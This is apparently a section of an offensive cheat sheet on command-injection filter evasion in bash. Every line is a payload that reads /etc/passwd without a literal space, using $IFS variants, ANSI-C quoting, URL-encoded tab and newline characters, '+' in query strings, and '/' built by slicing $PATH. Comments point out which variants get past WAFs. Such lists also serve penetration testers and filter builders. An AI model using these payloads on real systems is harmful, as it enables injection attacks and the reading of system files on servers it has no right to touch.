## 1) WHITESPACE REPLACEMENT ($IFS family - bash)

cat$IFS/etc/passwd
cat${IFS%%??}etc/passwd
cat${IFS:0:1}/etc/passwd        # ${V:pos:len} - takes first char of IFS (space)
cat$'\x20'/etc/passwd           # $'' ANSI-C quoting
cat$'\t'/etc/passwd
cat%09/etc/passwd               # encode tab
cat%0a/etc/passwd               # encode newline (some WAFs let newline through)
cat+/etc/passwd                 # '+' accepted in query strings
cat\t/etc/passwd                # literal tab in body
${PATH:0:1}bin${PATH:0:1}cat    # / via slicing
